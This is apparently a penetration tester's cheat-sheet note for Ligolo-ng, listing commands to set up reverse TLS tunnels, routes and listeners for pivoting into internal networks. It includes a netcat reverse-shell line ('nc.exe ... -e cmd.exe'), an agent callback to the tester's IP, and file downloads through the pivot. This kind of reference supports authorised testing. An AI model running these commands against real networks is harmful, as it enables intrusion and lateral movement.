---
tags:
  - tool
  - tunneling
---
# Ligolo-ng

A _simple_, _lightweight_ and _fast_ tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a **tun interface** (without the need of SOCKS) - [ligolo-ng](https://github.com/nicocha30/ligolo-ng)

## Capabilities

```powershell
# Start agent on kali
sudo ~/compiled_binaries/ligolo/proxy -selfcert
sudo ~/compiled_binaries/ligolo/proxy -selfcert -laddr 0.0.0.0:443

# Connect to agent on target
.\agent.exe -connect $OUR_IP:11601 -retry -ignore-cert
```

### Tunnel Management

**In Logolo session:**

```powershell
# Select session
session

# Create interface
ifcreate --name $INTERFACE

# Delete interface
ifdel --name $INTERFACE

# Start the tunnel
start --tun $INTERFACE

# List tunnels
tunnel_list

# Stop tunnel
stop --agent $AGENT_ID

# Check interface information
ifconfig

# Add routing information to global routing table
route_add --name $INTERFACE --route $CIDR

# Add local network to forward
route_add --name $INTERFACE --route 240.0.0.1/32
# Sample command to interact with local port 5000
curl 240.0.0.1:5000
```

**In Kali**

```powershell
# Add ipv6 route to the same interface
sudo ip -6 route add $TARGET_CIDR dev $INTERFACE

# Confirm routing information
ip r
```

### Forward Reverse Shell Connections

**In Logolo session:**

```powershell
# Setup listener
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443

# Check listeners
listener_list
```

**In normal terminal:**

```powershell
# On kali machine
rlwrap -crA nc -lvnp 9001

# On internal host
.\nc.exe $PIVOT_IP 9001 -e cmd.exe
```

### Upload Files

**In Logolo session:**

```powershell
# Setup listener for uploading files with python simple http server
listener_add -addr 0.0.0.0:9002 --to 127.0.0.1:80
```

**In normal terminal:**

```powershell
# On kali machine
python3 -m http.server 80

# On internal host
iwr -uri http://$PIVOT_IP:9002/example.txt -outfile example.txt
```
